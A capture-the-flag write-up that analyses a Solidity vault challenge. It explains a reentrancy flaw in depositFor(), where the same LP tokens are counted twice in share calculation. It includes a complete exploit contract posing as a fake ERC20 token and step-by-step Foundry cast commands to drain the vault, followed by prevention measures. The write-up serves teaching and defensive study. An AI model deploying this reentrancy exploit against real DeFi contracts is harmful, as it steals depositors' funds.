- [Smart Contract CTF Writeup](#smart-contract-ctf-writeup)
  - [1. Source Code Analysis](#1-source-code-analysis)
    - [1.1 Setup.sol](#11-setupsol)
    - [1.2 Vault.sol](#12-vaultsol)
    - [1.3 Strategy.sol](#13-strategysol)
    - [1.4 Interface.sol](#14-interfacesol)
  - [2. Vulnerability Analysis](#2-vulnerability-analysis)
    - [2.1 Reentrancy in depositFor()](#21-reentrancy-in-depositfor)
    - [2.2 Attack Flow](#22-attack-flow)
  - [3. Exploitation Implementation](#3-exploitation-implementation)
    - [3.1 Acquire LP Tokens using Cast](#31-acquire-lp-tokens-using-cast)
    - [3.2 Deploy Exploit Contract](#32-deploy-exploit-contract)
    - [3.3 Execute Attack](#33-execute-attack)
  - [4. Prevention Measures](#4-prevention-measures)


# Smart Contract CTF Writeup

## 1. Source Code Analysis
This challenge provides several source code files including `Setup.sol`, `Strategy.sol`, `Vault.sol` and `Interface.sol`. The objective is to reduce the Vault contract's LP token below half of its initial amount.

### 1.1 Setup.sol
The Setup contract initializes the challenge environment:
- wrap ETH into WETH
- create a Uniswap LP token (WETH/USDC pair)
- deploy a Strategy contract that interacts with SushiSwap's MasterChef
- deploy a Vault contract that manages user deposits
- deposit initial LP tokens into the vault

**Win Condition**: the `isSolved()` function checks if the Vault's LP token is less than half of the initial LP token amount.

### 1.2 Vault.sol
The Vault contract is an ERC20 token representing shares in the LP token pool:
- `deposit()`: allow users to deposit LP tokens and receive vault shares
  - protected by `nonReentrant` modifier
  - calculate shares based on the ratio of deposited amount to total balance
- `withdraw()`: burn shares and return propotional LP tokens
  - protected by `nonReentrant` modifier
- `depositFor()`: allow depositing on behalf of another user
  - **critical vulnerability**: missing `nonReentrant` modifier
  - accept arbitrary token address as parameter
  - use same share calculation logic as `deposit()`

Share calculation formula:
```
shares = (amount * totalSupply()) / pool
```

### 1.3 Strategy.sol
The Strategy contract manages LP tokens in SushiSwap's MasterChef:
- `deposit()`: stake LP tokens in MasterChef
- `withdraw()`: unstake LP tokens from MasterChef
- `harvest()`: collect rewards and reinvest them
- track staked balance in `balanceMasterChef` variable

### 1.4 Interface.sol
Contains interface definition for external contracts including Uniswap Router, MasterChef, and ERC20 tokens.

## 2. Vulnerability Analysis

### 2.1 Reentrancy in depositFor()
The critical vulnerability lies in the `depositFor()` function of Vault Contract. 
```sol
function depositFor(address token, uint _amount, address user) public {
    uint256 _pool = balance();                                    // Step 1: Record balance
    IERC20(token).transferFrom(msg.sender, address(this), _amount); // Step 2: REENTRANCY POINT
    earn();                                                       // Step 3: Stake to strategy
    uint256 _after = balance();                                   // Step 4: Get new balance
    _amount = _after - _pool;                                     // Step 5: Calculate deposited amount
    uint256 shares = 0;
    if (totalSupply() == 0) {
        shares = _amount;
    } else {
        shares = (_amount * totalSupply()) / (_pool);            // Step 6: Calculate shares
    }
    _mint(user, shares);                                         // Step 7: Mint shares
}
```
**The problem:**
- lack the `nonReentrant` modifier
- accept an arbitrary `token` address parameter
- the share calculation happens AFTER the `transferFrom()` call
- external call at step 2 happens before state updates (violates CEI pattern)
- an attacker can create a malicious ERC20 contract that reenters during `transferFrom()`

This is dangerous because
- `_pool` is recorded at step 1 and remains fixed
- during reentrancy, `totalSupply()` can be manipulated
- the first call continues with updated `totalSupply` but old `_pool`
- this causes the same LP tokens to be counted twice in share calculations

### 2.2 Attack Flow
The attack exploits the double-counting vulnerability through reentrancy.

Initial State:
- Vault balance: 137e12 LP tokens
- Total supply: 137e12 shares

**Attack Step:**
1. deploy malicious ERC20 contract
2. first `depositFor()` call: `depositFor(maliciousToken, amount, attacker)`
   1. vault records initial balance `_pool`
   2. call `maliciousToken.transferFrom()`: **reentrancy entry point**
3. Inside `transferFrom()`: `depositFor(realLpToken, amount, attacker)`
   1. transfer real LP tokens from attacker contract to vault
   2. valut stakes LP tokens to Strategy via `earn()`
   3. calculate and mint shares based on deposit
   4. `totalSupply` increases
4. First call continues:
   1. calculate `_amount` share using NEW `totalSupply` but OLD `_pool`: double counting
   2. mint excessive shares to attacker
5. Withdraw shares
   1. attacker withdraws most shares and receives much more LP than deposited
   2. vault balance drops below 50% threshold


**Summary**: The same LP tokens are counted twice in share calculation because:
- `_pool` is fixed at the start of the first call
- during reentrancy, real LP tokens increase vault balance and `totalSupply`
- first call continues with updated `totalSupply` but original `_pool`

## 3. Exploitation Implementation
**Given Information**
1. Private Key (attacker's account)
2. Setup Address (entry point contract)
3. RPC URL (blockchain node endpoint)

### 3.1 Acquire LP Tokens using Cast
Using Foundry's cast tool to acquire LP tokens is simpler and less error-prone.

1. Setup environment variables:
    ```bash
    export RPC_URL=XX
    export PRIVATE_KEY=YY
    export SETUP_ADDRESS=ZZ

    export WETH=0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    export USDC=0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
    export SUSHI_ROUTER=0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F
    export LP_TOKEN=0x397FF1542f962076d0BFE58eA045FfA2d347ACa0
    ```
2. Get contract address:
    ```bash
    YOUR_ADDRESS=$(cast wallet address --private-key $PRIVATE_KEY)
    VAULT=$(cast call $SETUP "vault()(address)" --rpc-url $RPC_URL)
    ```
3. Convert ETH to WETH:
    ```bash
    cast send $WETH "deposit()" --private-key $PRIVATE_KEY --rpc-url $RPC_URL --value 50ether
    ```
4. Swap half WETH for USDC:
    ```bash
    # Approve WETH
    cast send $WETH "approve(address,uint256)" $SUSHI_ROUTER 25000000000000000000 --private-key $PRIVATE_KEY --rpc-url $RPC_URL

    # Swap 25 WETH for USDC
    cast send $SUSHI_ROUTER "swapExactTokensForTokens(uint256,uint256,address[],address,uint256)" 25000000000000000000 0 "[$WETH,$USDC]" $YOUR_ADDRESS 9999999999 --private-key $PRIVATE_KEY --rpc-url $RPC_URL
    ```
5. Add liquidity to get LP tokens:
    ```bash
    # Get balances
    WETH_BAL=$(cast call $WETH "balanceOf(address)(uint256)" $YOUR_ADDRESS --rpc-url $RPC_URL | awk '{print $1}')
    USDC_BAL=$(cast call $USDC "balanceOf(address)(uint256)" $YOUR_ADDRESS --rpc-url $RPC_URL | awk '{print $1}')

    # Approve tokens
    cast send $WETH "approve(address,uint256)" $SUSHI_ROUTER $WETH_BAL --private-key $PRIVATE_KEY --rpc-url $RPC_URL

    cast send $USDC "approve(address,uint256)" $SUSHI_ROUTER $USDC_BAL --private-key $PRIVATE_KEY --rpc-url $RPC_URL

    # Add liquidity
    cast send $SUSHI_ROUTER "addLiquidity(address,address,uint256,uint256,uint256,uint256,address,uint256)" $WETH $USDC $WETH_BAL $USDC_BAL 0 0 $YOUR_ADDRESS 9999999999 --private-key $PRIVATE_KEY --rpc-url $RPC_URL

    # Verify LP balance
    LP_BAL=$(cast call $LP_TOKEN "balanceOf(address)(uint256)" $YOUR_ADDRESS --rpc-url $RPC_URL | awk '{print $1}')
    echo "LP Token Balance: $LP_BAL"
    ```

### 3.2 Deploy Exploit Contract
Create exploit.sol and deploy with constructor parameter: Vault address.
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IVault {
    function depositFor(address token, uint _amount, address user) external;
    function withdraw(uint256 _shares) external;
    function balanceOf(address account) external view returns (uint256);
    function lpToken() external view returns (address);
}

/**
 * @title VaultExploit
 * @notice Exploits the reentrancy vulnerability in Vault.depositFor()
 */
contract VaultExploit {
    IVault public vault;
    IERC20 public lpToken;
    address public owner;
    
    bool public attacking;
    uint256 public depositAmount;
    
    constructor(address _vault) {
        vault = IVault(_vault);
        lpToken = IERC20(vault.lpToken());
        owner = msg.sender;
        attacking = false;
    }
    
    /**
     * @notice Execute the attack
     * @param _amount Amount of LP tokens to use
     */
    function attack(uint256 _amount) external {
        require(msg.sender == owner, "Not owner");
        require(!attacking, "Already attacking");
        
        depositAmount = _amount;
        
        // CRITICAL: Transfer LP tokens from attacker to this contract
        lpToken.transferFrom(msg.sender, address(this), _amount);
        
        // CRITICAL: Approve vault to spend this contract's LP tokens
        lpToken.approve(address(vault), type(uint256).max);
        
        // Start attack: call depositFor with malicious token (this contract)
        attacking = true;
        vault.depositFor(address(this), _amount, address(this));
        attacking = false;
    }
    
    /**
     * @notice Withdraw all shares
     */
    function withdrawAll() external {
        require(msg.sender == owner, "Not owner");
        
        uint256 shares = vault.balanceOf(address(this));
        if (shares > 0) {
            vault.withdraw(shares);
        }
        
        // Transfer all LP tokens back to owner
        uint256 balance = lpToken.balanceOf(address(this));
        if (balance > 0) {
            lpToken.transfer(owner, balance);
        }
    }
    
    /**
     * @notice Simulate ERC20 transferFrom
     * @dev This is the reentrancy point
     */
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(msg.sender == address(vault), "Only vault");
        require(attacking, "Not in attack mode");
        
        // REENTER: Call depositFor with real LP tokens
        // At this point, vault's totalSupply is still low
        // So we can get massive shares with the same LP tokens
        vault.depositFor(address(lpToken), depositAmount, address(this));
        
        return true;
    }
    
    // Mock ERC20 functions
    function balanceOf(address) external pure returns (uint256) {
        return type(uint256).max;
    }
    
    function approve(address, uint256) external pure returns (bool) {
        return true;
    }
    
    function transfer(address, uint256) external pure returns (bool) {
        return true;
    }
    
    // View functions
    function getShares() external view returns (uint256) {
        return vault.balanceOf(address(this));
    }
    
    function getLpTokenBalance() external view returns (uint256) {
        return lpToken.balanceOf(address(this));
    }
}
```

Record the deployed contract address.

### 3.3 Execute Attack
1. Set exploit contract address:
    ```bash
    export EXPLOIT=AA
    ```
2. Approve exploit contract to use LP tokens:
    ```bash
    cast send $LP_TOKEN "approve(address,uint256)" $EXPLOIT $LP_BAL --private-key $PRIVATE_KEY --rpc-url $RPC_URL
    ```
3. Execute attack:
    ```bash
    cast send $EXPLOIT "attack(uint256)" $LP_BAL --private-key $PRIVATE_KEY --rpc-url $RPC_URL --gas-limit 5000000
    ```
4. Withdraw shares:
    ```bash
    cast send $EXPLOIT "withdrawAll()" --private-key $PRIVATE_KEY --rpc-url $RPC_URL --gas-limit 3000000
    ```
5. Verify success:
    ```bash
    cast call $SETUP "isSolved()(bool)" --rpc-url $RPC_URL
    ```

## 4. Prevention Measures
Major fixed include:
1. Add Reentrancy Guard: the most straightforward fix is to add `nonReentrant` modifier to `depositFor()`
1. Follow CEI Pattern: restructure the function to follow Checks-Effects-Interactions pattern
1. Restrict Token Parameter to prevent malicious contracts